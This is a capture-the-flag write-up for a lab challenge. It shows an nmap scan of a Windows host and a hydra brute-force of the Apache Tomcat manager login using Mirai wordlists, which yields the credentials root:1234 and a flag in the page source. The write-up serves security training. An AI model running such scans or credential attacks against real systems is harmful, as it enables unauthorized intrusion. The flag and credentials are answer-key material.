# 90b353_web_hacking_1

According to the course description, 90b353 is also in the FTP server. But this challenge is about web hacking/password cracking. So I guess the flag is in the web server.

So, the first step is to scan all ports in the FTP server.
```
nmap -p- -A -o scan_result.txt 10.0.3.197 

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
22/tcp    open  ssh           OpenSSH for_Windows_8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 4b:73:88:a7:76:a6:91:36:f9:22:d6:87:b2:c2:36:9b (RSA)
|   256 fb:43:86:c3:2b:57:50:19:c2:10:a1:08:8b:45:3c:13 (ECDSA)
|_  256 65:da:08:aa:fe:36:b0:ef:0a:df:77:97:92:d3:c8:51 (ED25519)
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title:       The Hacker Manifesto    
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2023-10-06T15:37:17+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=en2720-w1-lazarus
| Not valid before: 2023-08-27T17:21:48
|_Not valid after:  2024-02-26T17:21:48
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| ssl-cert: Subject: commonName=earth-custom-windows-image
| Subject Alternative Name: DNS:earth-custom-windows-image
| Not valid before: 2020-01-09T22:11:50
|_Not valid after:  2021-01-08T22:11:50
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
|_ssl-date: 2023-10-06T15:37:17+00:00; 0s from scanner time.
| tls-alpn: 
|_  http/1.1
8009/tcp  open  ajp13         Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8282/tcp  open  http          Apache Tomcat 9.0.21
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/9.0.21
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
```

Here, 8282/tcp is the web server we are looking for. Now we need to find a login page. After searching on the Internet https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat, there is a manager page in the Tomcat web server. So we can try to login to the manager page.

```
hydra -I -L /usr/share/wordlists/metasploit/mirai_user.txt -P /usr/share/wordlists/metasploit/mirai_pass.txt -s 8282 10.0.3.197 http-get /manager/html


[8282][http-get] host: 10.0.3.197   login: root   password: 1234
```

After login to the manager page, we can find one page called `/hacktheplanet-816494cc2ba913de`, open the page and open the developer tool, we can find the flag in the source code.

```
<img src="C:\ProgramData\Tomcat9\webapps\hacktheplanet-816494cc2ba913de\flag{90b3532e80ca784d593f4cb959ac510816911fd621e536}.jpg" alt="wooow, what a flag">
```